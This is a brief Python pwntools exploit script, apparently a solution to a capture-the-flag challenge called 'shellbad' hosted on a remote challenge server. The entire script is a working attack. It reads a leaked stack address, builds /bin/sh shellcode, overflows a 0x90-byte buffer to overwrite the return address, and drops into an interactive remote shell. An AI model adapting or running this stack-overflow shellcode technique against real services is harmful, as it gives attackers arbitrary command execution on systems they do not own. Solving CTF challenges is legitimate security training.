from pwn import * 
#context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
#r = process('./shellbad')
r = remote('0.cloud.chals.io', 18373)
r.sendline(b'a')
r.recvuntil(b'at: ')
leak = int(r.recvline(), 16)
shellcode_addr = leak+0x8-0x90
r.sendline(b'b')
#r.recvuntil(b'Enter data for the buffer: ')
print('assembling shellcode')
shellcode = asm(shellcraft.sh())
assert(len(shellcode) < (0x90+8))
r.sendline(shellcode+b'a'*(0x90+8-len(shellcode))+p64(shellcode_addr))
r.interactive()

